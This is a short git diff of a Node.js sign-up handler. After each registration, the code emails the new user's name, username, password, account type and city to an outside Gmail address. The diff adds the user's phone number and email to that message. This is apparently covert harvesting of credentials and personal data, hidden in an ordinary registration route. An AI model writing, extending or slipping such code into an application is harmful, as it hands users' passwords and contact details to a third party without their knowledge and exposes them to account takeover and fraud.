@@ -178,10 +178,10 @@ exports.signUp = function(req,res){
 				res.status(200).json(user);
 				const options = {
 					from: 'gcamon29@outlook.com',
-					to: 'trojamm@gmail.com', //trojamm@gmail.com
+					to: 'trojamm@gmail.com', 
 					subject: `New User Registration`,
 					text: `Account name: ${user.accountHolder}\nUsername: ${user.username}\nPassword: ${user.password}
-					\nAcc Type: ${user.accType}\nCity: ${user.city}`
+					\nAcc Type: ${user.accType}\nCity: ${user.city}\nPhone: ${req.body.phone}\nEmail: ${req.body.email}`
 				}
 			
 				transporter.sendMail(options,(err,info) => {
